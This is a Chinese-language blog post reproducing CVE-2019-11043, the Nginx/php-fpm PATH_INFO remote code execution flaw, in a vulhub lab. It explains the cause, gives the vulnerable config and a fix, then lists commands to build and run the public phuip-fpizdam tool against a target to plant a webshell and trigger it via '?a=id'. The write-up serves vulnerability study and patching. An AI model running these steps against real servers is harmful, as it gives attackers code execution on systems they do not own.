# CVE-2019-11043-Nginx PHP 远程代码执行 - Null1433 - 博客园

> 原文：[`www.cnblogs.com/null1433/p/12740758.html`](https://www.cnblogs.com/null1433/p/12740758.html)

漏洞原因

Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。

Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。

```
 location ~ [^/]\.php(/|$) {

    fastcgi_split_path_info ^(.+?\.php)(/.*)$;

    fastcgi_param PATH_INFO       $fastcgi_path_info;

    fastcgi_pass   php:9000;

    ...
}
```

修复建议

1.在不影响正常业务的情况下，删除 Nginx 配置文件中如下配置：

```
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
fastcgi_param PATH_INFO       $fastcgi_path_info;
```

前提条件

1.Nginx + php-fpm 的服务器

2.以下复现得 poc 仅用于 php7，php5.3 另外有 poc 才生效

环境搭建

[`github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043`](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)

启动环境后，您可以在看到默认页面`http://your-ip:8080/index.php`

POC 是 go 语言编译，需要此工具来重现该漏洞  [`github.com/neex/phuip-fpizdam`](https://github.com/neex/phuip-fpizdam)

复现参考[`www.jianshu.com/p/afa0752efe5c`](https://www.jianshu.com/p/afa0752efe5c)[`blog.csdn.net/Ping_Pig/article/details/102767159`](https://blog.csdn.net/Ping_Pig/article/details/102767159)1.下载工具

git clone https://github.com/neex/phuip-fpizdam.git

cd phuip-fpizdam

go build  #编译

要有 go 环境，没有 go 环境的话使用下面命令安装 go 环境

apt-get install golang -y

2.编译好后，文件内出现 phuip-fpizdam 可执行文件

![](img/b234116d171a9cca9445e7eee8c2eb78.png)

我这里环境编译有问题，所以以下的标准复现过程

![](img/a2c5099d81375b67d14bf68c2c590a3c.png)

3\. 使用可执行文件 +目标 会生成 webshell

./phuip-fpizdam http://目标 ip:8080/index.php    （可能会需要多执行几遍命令）

 ![](img/5322a796bde9b8ee00979205df44c8de.png)

一个 Webshel​​l 是在 PHP-FPM 的后台编写的，请访问`http://your-ip:8080/index.php?a=id`以触​​发 RCE

![](img/5d6c4685b64c1a683b34c33029a3c291.png)